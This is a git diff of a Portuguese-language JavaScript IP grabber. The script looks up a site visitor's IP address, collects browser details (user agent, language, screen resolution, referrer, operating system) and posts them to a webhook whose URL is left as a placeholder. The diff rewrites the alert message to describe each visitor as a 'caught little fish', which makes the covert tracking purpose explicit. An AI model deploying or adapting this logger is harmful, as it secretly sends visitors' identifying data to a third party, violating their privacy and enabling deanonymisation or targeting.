@@ -3,7 +3,7 @@
       .then(response => response.json())
       .then(data => {
         const ipAddress = data.ip;
-        const webhookUrl = 'APAGUE AQUI E COLOQUE O WEBHOOK URL AQUI!!!!!!!!!!!!!!!!!!!!!!';
+        const webhookUrl = 'APAGUE E COLOQUE O WEBHOOK URL AQUI!!!!!!!!!!!!!!!!!!!!!!';
 
         const userAgent = navigator.userAgent;
         const language = navigator.language;
@@ -12,7 +12,7 @@
         const referrer = document.referrer;
         const operatingSystem = navigator.platform;
 
-        const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
+        const message = `@everyone Novo peixinho pescado oniichans👉👈☺️ \nIP do peixinho: ${ipAddress} \nUser-Agent: ${userAgent} \nNavegador Linguagem: ${language} \nResolução da tela: ${screenWidth}x${screenHeight} \nReferencial: ${referrer} \nSistema Operacional: ${operatingSystem}`;
 
         fetch(webhookUrl, {
           method: 'POST',
